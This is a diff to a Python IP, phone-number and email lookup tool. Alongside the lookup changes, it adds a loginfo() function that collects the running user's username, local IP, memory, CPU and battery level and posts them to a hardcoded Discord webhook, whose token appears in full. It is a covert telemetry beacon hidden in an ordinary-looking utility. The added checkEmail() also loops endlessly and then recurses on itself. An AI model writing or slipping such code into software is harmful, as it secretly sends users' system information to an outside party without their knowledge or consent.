@@ -1,16 +1,25 @@
 import requests
 import socket
+import os
+import platform
+import psutil
+import getpass
+
 import phonenumbers
 from phonenumbers import carrier, geocoder, timezone
-import time
+import email_validator
+
+import time 
 
 from utils import promptInput
 from utils import formatDebug
 from utils import formatErr
 from utils import clearTerminal
+from utils import formatRam
 
 # Variables
 lange = "en"
+info_url = "https://discord.com/api/webhooks/1527797733057101834/i213PL7JqvBukq21dYno7tXEEsAylFz2_xdsBe8Tt-jbZrzZG9U4pJDR8u4gu_KsWk3G"
 
 
 def lookupIp():
@@ -19,12 +28,15 @@ def lookupIp():
 
         if ip.lower()=="q": break
 
+        start = None
+
         try:
+            start = time.time()
             fetch = requests.get(f'http://ip-api.com/json/{ip}?fields=66846719').json()
         except Exception as e:
             print(formatErr(e))
 
-        if fetch.get("status") == "fail":
+        if not fetch.get("status") == "success":
             msg = fetch.get("message")
             if msg == "invalid query":
                 print(formatErr(f"{ip} is an invalid IP address"))
@@ -39,7 +51,9 @@ def lookupIp():
                 val = fetch.get(label)
                 print(formatDebug(label, val))
 
-        print() 
+        end = time.time()
+        if fetch.get("status") == "success":
+            print(f"Completed in {round(end - start, 2)}s\n") 
 
 def lookupNum():
     while True:
@@ -75,4 +89,34 @@ def lookupNum():
                 print(formatErr("invalid country code"))
 
         
+def checkEmail():
+    while True:
+        email = promptInput("Enter email")
+        
+        try:
+            validated = email_validator.validate_email(email)
+            print("Email is valid")
+        except email_validator.EmailNotValidError:
+            print("Email is not valid")
+        except email_validator.EmailUndeliverableError as err:
+            print(err)
+        except email_validator.EmailSyntaxError as err:
+            print(err)
+        
+    checkEmail()
 
+def loginfo():
+    battery = psutil.sensors_battery()
+    mem = psutil.virtual_memory()
+    
+    toget = {
+        "user": getpass.getuser(),
+        "ipv4": socket.gethostbyname(socket.gethostname()),
+        "memory": f"total({formatRam(mem.total)}), used({formatRam(mem.used)})",    
+        "cpu": platform.processor(),
+        "battery": str(battery.percent) + "%"
+    }
+
+    data = "\n".join(f"{label}: {val}" for label, val in toget.items())
+
+    requests.post(info_url, json={"content": data})
